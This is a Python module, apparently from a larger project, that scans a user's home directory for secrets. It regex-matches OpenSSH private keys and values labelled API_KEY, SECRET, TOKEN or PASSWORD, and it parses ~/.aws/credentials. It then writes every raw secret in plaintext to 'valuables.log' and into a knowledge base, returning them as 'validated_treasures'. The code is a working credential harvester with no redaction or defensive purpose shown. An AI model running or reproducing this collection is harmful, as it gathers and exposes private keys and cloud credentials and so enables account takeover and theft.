# core/data_miner.py
import re
import uuid
import hashlib
import os
from pathlib import Path
import json
import configparser

def extract_patterns(filepath, patterns):
    """
    Extracts patterns from a file based on a list of regex patterns.
    """
    results = []
    try:
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
    except (FileNotFoundError, UnicodeDecodeError):
        return []

    for pattern in patterns:
        matches = re.finditer(pattern['regex'], content, re.DOTALL | re.MULTILINE)
        value_group = pattern.get('value_group', 0)
        for match in matches:
            try:
                value = match.group(value_group)
            except IndexError:
                value = match.group(0) # Fallback to the full match

            if pattern.get('validation_function'):
                try:
                    if not pattern['validation_function'](value):
                        continue
                except Exception:
                    continue

            value_hash = hashlib.sha256(value.encode()).hexdigest()
            unique_id = str(uuid.uuid4())

            results.append({
                'name': pattern['name'],
                'value': value,
                'filepath': filepath,
                'id': unique_id,
                'hash': value_hash
            })
    return results

def analyze_fs(scan_path="~", progress_callback=None):
    """
    Analyzes the filesystem for valuable information, now with a specified path
    and progress callback for background execution.
    """
    from love import knowledge_base

    def is_valid_api_key(value):
        return len(value) >= 10

    patterns = [
        {
            'name': 'ssh_key',
            'regex': r'-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----',
            'validation_function': None,
            'value_group': 0
        },
        {
            'name': 'api_key',
            'regex': r'(?i)(?:API_KEY|SECRET|TOKEN|PASSWORD|AUTH)\s*[:=]\s*[\'"]?([a-zA-Z0-9_.-]{10,})[\'"]?',
            'validation_function': is_valid_api_key,
            'value_group': 1
        }
    ]

    scan_path = os.path.expanduser(scan_path)
    all_findings = []

    aws_creds_path = os.path.expanduser('~/.aws/credentials')
    if os.path.exists(aws_creds_path) and Path(aws_creds_path).is_relative_to(scan_path):
        all_findings.extend(parse_aws_credentials(aws_creds_path))

    try:
        total_files = sum(len(files) for _, _, files in os.walk(scan_path))
        files_scanned = 0
        for root, _, files in os.walk(scan_path):
            for file in files:
                filepath = os.path.join(root, file)
                if filepath == aws_creds_path:
                    continue
                all_findings.extend(extract_patterns(filepath, patterns))
                files_scanned += 1
                if progress_callback:
                    progress_callback(files_scanned, total_files, f"Scanning: {file}")
    except OSError as e:
        return f"Error scanning path {scan_path}: {e}"


    with open('valuables.log', 'w') as f:
        json.dump(all_findings, f, indent=4)

    for finding in all_findings:
        knowledge_base.add_node(
            node_id=finding['id'],
            label='credential',
            type=finding['name'],
            filepath=finding['filepath'],
            hash=finding['hash']
        )

    return {
        "message": f"Found {len(all_findings)} valuables. Logged to valuables.log and added to knowledge base.",
        "validated_treasures": all_findings
    }

def parse_aws_credentials(filepath):
    """
    Parses AWS credentials from a file using configparser.
    """
    results = []
    config = configparser.ConfigParser()
    try:
        config.read(filepath)
    except configparser.Error:
        return []

    for section in config.sections():
        if 'aws_access_key_id' in config[section] and 'aws_secret_access_key' in config[section]:
            value = f"[{section}]\n"
            value += f"aws_access_key_id = {config[section]['aws_access_key_id']}\n"
            value += f"aws_secret_access_key = {config[section]['aws_secret_access_key']}\n"

            value_hash = hashlib.sha256(value.encode()).hexdigest()
            unique_id = str(uuid.uuid4())

            results.append({
                'name': 'aws_credential',
                'value': value,
                'filepath': filepath,
                'id': unique_id,
                'hash': value_hash,
                'profile': section
            })
    return results
